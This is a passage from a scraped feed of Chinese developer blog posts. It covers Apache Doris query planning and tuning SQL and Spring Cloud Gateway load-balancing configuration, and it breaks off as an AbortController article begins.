<span class="hljs-symbol">DataSink:</span> DataStreamSink (HASH_PARTITIONED <span class="hljs-keyword">to</span> Fragment <span class="hljs-number">1</span>)

<span class="hljs-symbol">Instances:</span>
  - Instance <span class="hljs-number">0</span> @ BE1: Scan orders Tablet[<span class="hljs-number">0</span>,<span class="hljs-number">3</span>], <span class="hljs-keyword">Join</span>, Agg
  - Instance <span class="hljs-number">1</span> @ BE2: Scan orders Tablet[<span class="hljs-number">1</span>,<span class="hljs-number">4</span>], <span class="hljs-keyword">Join</span>, Agg
  - Instance <span class="hljs-number">2</span> @ BE3: Scan orders Tablet[<span class="hljs-number">2</span>,<span class="hljs-number">5</span>], <span class="hljs-keyword">Join</span>, Agg
</code></pre>
<h3 data-id="heading-33">7.4 执行流程图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FE as FE Coordinator
    participant BE1 as BE1
    participant BE2 as BE2
    participant BE3 as BE3
    
    FE-&gt;&gt;BE1: Execute Fragment 0 Instance 0
    FE-&gt;&gt;BE2: Execute Fragment 0 Instance 1
    FE-&gt;&gt;BE3: Execute Fragment 0 Instance 2
    
    Note over BE1,BE3: 扫描 customers 表
    BE1--&gt;&gt;BE1: Scan customers, filter region='ASIA'
    BE2--&gt;&gt;BE2: Scan customers, filter region='ASIA'
    BE3--&gt;&gt;BE3: Scan customers, filter region='ASIA'
    
    BE1-&gt;&gt;BE1: Build Bloom Filter on customer_id
    BE2-&gt;&gt;BE2: Build Bloom Filter on customer_id
    BE3-&gt;&gt;BE3: Build Bloom Filter on customer_id
    
    BE1-&gt;&gt;FE: Publish Runtime Filter
    
    FE-&gt;&gt;BE1: Execute Fragment 2 Instance 0 (with RF)
    FE-&gt;&gt;BE2: Execute Fragment 2 Instance 1 (with RF)
    FE-&gt;&gt;BE3: Execute Fragment 2 Instance 2 (with RF)
    
    Note over BE1,BE3: 扫描 orders 表 (应用 Runtime Filter)
    BE1--&gt;&gt;BE1: Scan orders + Apply Bloom Filter
    BE2--&gt;&gt;BE2: Scan orders + Apply Bloom Filter
    BE3--&gt;&gt;BE3: Scan orders + Apply Bloom Filter
    
    Note over BE1,BE3: Broadcast Join (接收 customers 数据)
    BE1-&gt;&gt;BE1: Receive customers from all BEs
    BE2-&gt;&gt;BE2: Receive customers from all BEs
    BE3-&gt;&gt;BE3: Receive customers from all BEs
    
    BE1--&gt;&gt;BE1: Hash Join + Pre-Agg
    BE2--&gt;&gt;BE2: Hash Join + Pre-Agg
    BE3--&gt;&gt;BE3: Hash Join + Pre-Agg
    
    FE-&gt;&gt;FE: Execute Fragment 1 Instance 0
    
    BE1-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    BE2-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    BE3-&gt;&gt;FE: Send aggregated data (Hash Partitioned)
    
    FE--&gt;&gt;FE: Merge Aggregation + TOP-N + LIMIT
    
    FE--&gt;&gt;Client: Return Result
</code></pre>
<h3 data-id="heading-34">7.5 性能优化点</h3>
<ol>
<li>
<p><strong>Runtime Filter</strong>：</p>
<ul>
<li>customers 表过滤后生成 Bloom Filter</li>
<li>下推到 orders 扫描，减少数据量约 80%</li>
</ul>
</li>
<li>
<p><strong>Broadcast Join</strong>：</p>
<ul>
<li>customers 表过滤后很小（假设 1000 行）</li>
<li>广播比 Shuffle 两表更高效</li>
</ul>
</li>
<li>
<p><strong>两阶段聚合</strong>：</p>
<ul>
<li>Fragment 2：本地预聚合（减少网络传输）</li>
<li>Fragment 1：最终聚合（单节点汇总）</li>
</ul>
</li>
<li>
<p><strong>谓词下推</strong>：</p>
<ul>
<li><code>order_date &gt;= '2024-01-01'</code> 下推到存储层</li>
<li><code>region = 'ASIA'</code> 下推到存储层</li>
</ul>
</li>
<li>
<p><strong>列裁剪</strong>：</p>
<ul>
<li>orders 表只读取：customer_id, order_date, amount</li>
<li>customers 表只读取：id, customer_name, region</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-35">8. 总结与最佳实践</h2>
<h3 data-id="heading-36">8.1 本章核心要点</h3>
<ol>
<li>
<p><strong>Planner 架构</strong>：</p>
<ul>
<li>抽象基类 Planner 定义统一接口</li>
<li>NereidsPlanner 基于 Cascades 框架实现 CBO</li>
<li>查询计划分为逻辑计划和物理计划</li>
</ul>
</li>
<li>
<p><strong>PlanNode 树</strong>：</p>
<ul>
<li>PlanNode 是查询计划的基本单元</li>
<li>核心节点：ScanNode、JoinNode、AggregationNode</li>
<li>通过 conjuncts 和 RuntimeFilter 优化查询</li>
</ul>
</li>
<li>
<p><strong>PlanFragment</strong>：</p>
<ul>
<li>查询计划被分解为多个可并行执行的 Fragment</li>
<li>通过 ExchangeNode 连接不同 Fragment</li>
<li>Coordinator 负责调度 Fragment 到 BE 执行</li>
</ul>
</li>
<li>
<p><strong>分布式策略</strong>：</p>
<ul>
<li>Join 分布式：Broadcast、Shuffle、Colocate</li>
<li>Aggregation 分阶段：本地预聚合 + 全局聚合</li>
<li>Runtime Filter：动态过滤器优化 Join 性能</li>
</ul>
</li>
<li>
<p><strong>NereidsPlanner</strong>：</p>
<ul>
<li>基于 Cascades 的 CBO 优化器</li>
<li>完善的代价模型和统计信息</li>
<li>模式匹配规则，易于扩展</li>
</ul>
</li>
</ol>
<h3 data-id="heading-37">8.2 Planner 调优建议</h3>
<h4 data-id="heading-38">8.2.1 Join 优化</h4>
<p><strong>选择合适的 Join 分布式策略</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 大表 JOIN 小表：使用 Broadcast</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*+ SET_VAR(broadcast_row_limit=10000000) */</span> <span class="hljs-operator">*</span>
<span class="hljs-keyword">FROM</span> large_table l
<span class="hljs-keyword">JOIN</span> small_table s <span class="hljs-keyword">ON</span> l.id <span class="hljs-operator">=</span> s.id;

<span class="hljs-comment">-- 大表 JOIN 大表：使用 Shuffle</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table1 t1
<span class="hljs-keyword">JOIN</span> table2 t2 <span class="hljs-keyword">ON</span> t1.key <span class="hljs-operator">=</span> t2.key;

<span class="hljs-comment">-- Colocate Join：建表时设置</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table1 (...)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(key) BUCKETS <span class="hljs-number">32</span>
PROPERTIES("colocate_with" <span class="hljs-operator">=</span> "group1");

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table2 (...)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(key) BUCKETS <span class="hljs-number">32</span>
PROPERTIES("colocate_with" <span class="hljs-operator">=</span> "group1");
</code></pre>
<h4 data-id="heading-39">8.2.2 聚合优化</h4>
<p><strong>利用流式预聚合</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 适合流式预聚合（GROUP BY 基数适中）</span>
<span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> region;  <span class="hljs-comment">-- region 只有 10 个值</span>

<span class="hljs-comment">-- 不适合流式预聚合（GROUP BY 基数极高）</span>
<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">FROM</span> events
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id;  <span class="hljs-comment">-- user_id 有 1 亿个值</span>
</code></pre>
<p><strong>手动设置</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> enable_streaming_preaggregation <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">-- 禁用流式预聚合</span>
</code></pre>
<h4 data-id="heading-40">8.2.3 Runtime Filter 调优</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 增加 Runtime Filter 等待时间（适用于大表 Join）</span>
<span class="hljs-keyword">SET</span> runtime_filter_wait_time_ms <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;

<span class="hljs-comment">-- 调整 Bloom Filter 大小</span>
<span class="hljs-keyword">SET</span> runtime_bloom_filter_size <span class="hljs-operator">=</span> <span class="hljs-number">16777216</span>;  <span class="hljs-comment">-- 16MB</span>

<span class="hljs-comment">-- 设置 Runtime Filter 类型</span>
<span class="hljs-keyword">SET</span> runtime_filter_type <span class="hljs-operator">=</span> "BLOOM_FILTER,MIN_MAX";
</code></pre>
<h4 data-id="heading-41">8.2.4 分区裁剪</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建分区表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    order_id <span class="hljs-type">BIGINT</span>,
    order_date <span class="hljs-type">DATE</span>,
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)
)
<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span>(order_date) (
    <span class="hljs-keyword">PARTITION</span> p202401 <span class="hljs-keyword">VALUES</span> LESS THAN ("2024-02-01"),
    <span class="hljs-keyword">PARTITION</span> p202402 <span class="hljs-keyword">VALUES</span> LESS THAN ("2024-03-01"),
    ...
);

<span class="hljs-comment">-- 查询时利用分区裁剪</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> order_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-02-01'</span> 
  <span class="hljs-keyword">AND</span> order_date <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2024-03-01'</span>;
<span class="hljs-comment">-- 只扫描 p202402 分区</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[004-spring cloud alibaba之gateway网关-负载均衡]]></title>    <link>https://juejin.cn/post/7592075359379816500</link>    <guid>https://juejin.cn/post/7592075359379816500</guid>    <pubDate>2026-01-06T07:55:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592075359379816500" data-draft-id="7591942733365559330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="004-spring cloud alibaba之gateway网关-负载均衡"/> <meta itemprop="keywords" content="微服务"/> <meta itemprop="datePublished" content="2026-01-06T07:55:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="超级小猪"/> <meta itemprop="url" content="https://juejin.cn/user/3702810891008525"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            004-spring cloud alibaba之gateway网关-负载均衡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810891008525/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    超级小猪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:55:42.000Z" title="Tue Jan 06 2026 07:55:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">gateway负载均衡</h2>
<blockquote>
<p>主要内容：使用自动负载均衡能力/手动负载均衡。启动多个user服务。让gateway自动选择需要路由到哪个user服务中。这其中有两点需要关心</p>
<ul>
<li>自动负载能力：一般采用轮询的方式调用user服务</li>
<li>gateway查找规则：user服务注册到nacos上gateway会按照注册的服务名称自动映射到对应的服务<br/>
手动负载均衡同样可以实现上面的能力还可以避免暴露nacos服务注册的服务名</li>
</ul>
</blockquote>
<ul>
<li>自动负载均衡</li>
<li>手动负载均衡</li>
</ul>
<h3 data-id="heading-1">1、gateway自动负载均衡</h3>
<h4 data-id="heading-2">1.1 启动服务情况</h4>
<p>启动两个user服务</p>





















<table><thead><tr><th>服务</th><th>端口</th></tr></thead><tbody><tr><td>user</td><td>9001</td></tr><tr><td>user</td><td>9002</td></tr><tr><td>gateway</td><td>9999</td></tr></tbody></table>
<p>服务都注册到nacos上面</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c18508efa6594cda8b63976bd34bfac3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LaF57qn5bCP54yq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290941&amp;x-signature=jW4%2B%2Beph%2BdCOrQx0sEJNBVQNMKw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">1.2 gateway配置文件</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway-service</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">10.106</span><span class="hljs-number">.114</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">locator:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<p>其中<code>gateway.discovery.locator.enabled=true</code>就是开启自动负载功能。此时如何访问：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A9999%2Fuser%2Fuser%2Fhello" target="_blank" title="http://localhost:9999/user/user/hello" ref="nofollow noopener noreferrer">http://localhost:9999/user/user/hello</a> 就能够自动访问到user服务。前面一个/user/是在找nacos上面的服务，后面一个/user/是我们前面配置的context-path。所以我们可以去掉context-path然后重启user，这样访问路径就变成：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A9999%2Fuser%2Fhello" target="_blank" title="http://localhost:9999/user/hello" ref="nofollow noopener noreferrer">http://localhost:9999/user/hello</a></p>
<h5 data-id="heading-4">1.2.1 user服务配置文件变更</h5>
<p>变更前</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>
  <span class="hljs-attr">servlet:</span>
    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/user/</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">discovery:</span>
      <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>

<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre>
<p>变更后</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">discovery:</span>
      <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>

<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre>
<p>这种自动负载会暴露我们nacos注册的服务名字。还可以使用手动负载</p>
<h3 data-id="heading-5">2、手动负载均衡</h3>
<p>修改gateway配置文件</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway-service</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">10.106</span><span class="hljs-number">.114</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">locator:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://user</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/cjxz/**</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">StripPrefix=1</span> <span class="hljs-comment"># 去掉第一个路径：/cjxz/</span>
<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AbortController 深度解析：Web 开发中的“紧急停止开关”]]></title>    <link>https://juejin.cn/post/7591778827308924968</link>    <guid>https://juejin.cn/post/7591778827308924968</guid>    <pubDate>2026-01-06T05:57:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591778827308924968" data-draft-id="7591786340322181154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AbortController 深度解析：Web 开发中的“紧急停止开关”"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T05:57:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只爱吃糖的小羊"/> <meta itemprop="url" content="https://juejin.cn/user/1865251025859358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AbortController 深度解析：Web 开发中的“紧急停止开关”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1865251025859358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只爱吃糖的小羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:57:02.000Z" title="Tue Jan 06 2026 05:57:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 